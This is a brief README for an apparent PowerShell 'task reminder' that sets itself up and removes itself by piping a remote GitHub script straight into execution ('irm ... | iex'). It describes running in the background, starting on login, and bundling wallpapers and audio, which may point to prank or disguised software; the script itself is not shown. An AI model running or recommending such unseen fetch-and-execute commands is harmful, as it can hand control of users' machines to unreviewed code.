## Run the program instantly from any computer

No installation or prerequisites are needed. The program runs in the background.

## Setup

```
irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex
```

### Logging

Logs are stored at ***%TEMP%\TaskReminder\log.txt***
## Removal

This script creates a helpful system that boots the program on login, this is not dissimilar to many other software solutions. To remove this functionality utilise the following procedure through Microsoft Powershell.

```
$env:TR_ACTION = 'stop'; irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex
```

## Disclaimer

This program, along with the desktop backgrounds, audio files, and website directory included in the `.ps1` script, while curated by the author of this repository, [Kiyan-7](https://github.com/Kiyan-7), are not the intellectual property of nor copyright/trademark holding state of the author. [Kiyan-7](https://github.com/Kiyan-7) permits for you to do as you wish with the program.

> "We have the watch, and I'll see you in Valhalla"
